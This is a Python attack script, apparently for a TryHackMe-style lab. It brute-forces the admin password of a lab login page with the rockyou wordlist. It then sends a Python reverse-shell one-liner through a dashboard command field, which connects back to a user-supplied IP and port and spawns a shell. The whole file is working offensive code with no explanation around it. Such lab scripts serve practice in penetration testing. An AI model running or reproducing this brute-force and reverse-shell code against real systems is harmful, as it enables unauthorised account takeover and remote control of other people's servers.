import requests
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()
url = 'http://python.thm/labs/lab4/login.php'
cmd_url='http://python.thm/labs/lab4/dashboard.php'
wordlist = '/usr/share/wordlists/rockyou.txt'
username = 'admin'
pass_found = False

def brute_force(password):
    global pass_found
    if pass_found:
        return None

    data = {"username": username, "password": password}
    response = session.post(url, data=data)
    
    if "Invalid" in response.text:
        print('Invalid password:', password)
    else:
        print("Password FOUND!!!!:", password)
        pass_found = True  
        return password
        
def passwords():
    global pass_found
    with open(wordlist, 'r', encoding='latin-1') as f:
        for line in f:
            if pass_found:  # Если пароль нашли - перестаём выдавать пароли
                print("Stopping password generation...")
                break
            yield line.strip()

print("Starting bruteforce...")

with ThreadPoolExecutor(max_workers=2) as executor:
    results = executor.map(brute_force, passwords())
    
    for result in results:
        if result:
            executor.shutdown(wait=False)
            break

print("Bruteforce finished!")  


def exec_cmd():
    ip = input('YOUR_IP>:')
    port = input('YOUR_PORT:>')
    
    payload = f"export RHOST={ip}; export RPORT={port}; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'"
    
    response = session.post(cmd_url, data={"cmd": payload})
    
    if response.status_code == 200:
        print("cmd executing success:", response.text)

exec_cmd()